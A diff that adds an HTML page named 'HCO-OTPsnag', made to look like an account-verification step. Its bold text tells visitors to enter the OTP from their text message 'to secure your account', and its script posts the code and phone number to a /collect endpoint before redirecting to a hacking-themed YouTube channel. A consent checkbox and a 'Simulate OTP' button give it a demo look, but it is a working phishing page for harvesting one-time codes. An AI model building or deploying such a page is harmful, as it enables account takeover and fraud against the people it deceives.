@@ -1,0 +1,94 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <title>HCO-OTPsnag — OTP Verification</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body{background:#0f0f10;color:#eaeaea;font-family:system-ui;padding:18px}
+    .card{background:#121214;padding:18px;border-radius:10px;max-width:720px;margin:24px auto;box-shadow:0 6px 18px rgba(0,0,0,0.6)}
+    label{display:block;margin-top:10px}
+    input[type="text"]{padding:10px;border-radius:6px;border:1px solid #333;width:100%;box-sizing:border-box;background:#0b0b0b;color:#fff}
+    button{padding:10px 14px;border-radius:8px;border:0;cursor:pointer;font-weight:700;background:#1f8bff;color:#fff}
+    .muted{color:#9aa0a6;font-size:13px}
+    .small{font-size:13px;color:#bbb}
+    pre#status{background:#0b0b0b;padding:10px;border-radius:6px;color:#ddd}
+    .green-bold{color:#16a34a;font-weight:700}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Account Verification</h2>
+
+    <p class="muted">To secure your account, please complete the OTP step below.</p>
+
+    <!-- Requested line in bold green -->
+    <p class="green-bold">Enter the one OTP you got in your text message to secure your account</p>
+
+    <div style="margin-top:12px">
+      <label><input id="consent" type="checkbox" /> I agree to submit a test OTP for educational/demo purposes (I own this device or I have given explicit permission).</label>
+    </div>
+
+    <div id="formArea" style="display:none;margin-top:12px">
+      <label class="small">Phone / Identifier (optional)</label>
+      <input id="phone" type="text" placeholder="e.g. +91 98765 43210 (optional)" />
+      <label class="small">OTP</label>
+      <input id="otp" type="text" placeholder="Enter the OTP" maxlength="64" />
+      <div style="margin-top:12px;display:flex;gap:8px">
+        <button id="submit">Submit OTP</button>
+        <button id="simulate">Simulate OTP</button>
+      </div>
+      <pre id="status"></pre>
+    </div>
+
+    <div style="margin-top:12px" class="muted small">
+      After submission you will be redirected to our YouTube channel shortly.
+    </div>
+  </div>
+
+<script>
+const consent = document.getElementById('consent');
+const formArea = document.getElementById('formArea');
+const submitBtn = document.getElementById('submit');
+const simulateBtn = document.getElementById('simulate');
+const otpInput = document.getElementById('otp');
+const phoneInput = document.getElementById('phone');
+const status = document.getElementById('status');
+
+consent.addEventListener('change', ()=>{
+  formArea.style.display = consent.checked ? 'block' : 'none';
+});
+
+simulateBtn.addEventListener('click', ()=>{
+  otpInput.value = Math.floor(100000 + Math.random()*900000).toString();
+});
+
+submitBtn.addEventListener('click', async ()=>{
+  if (!consent.checked) { status.textContent = 'You must give consent before submitting.'; return; }
+  const otp = (otpInput.value||'').trim();
+  if (!otp) { status.textContent = 'Enter a test OTP.'; return; }
+  status.textContent = 'Submitting (consented)...';
+
+  const payload = {
+    consent: true,
+    otp: otp,
+    note: phoneInput.value || ''
+  };
+
+  try {
+    const res = await fetch('/collect', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(payload)
+    });
+    const j = await res.json();
+    status.textContent = 'Server response: ' + JSON.stringify(j);
+    // redirect back to YouTube after short delay
+    if (res.ok) setTimeout(()=> { window.location.href = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"; }, 2500);
+  } catch (e) {
+    status.textContent = 'Error: ' + e;
+  }
+});
+</script>
+</body>
+</html>
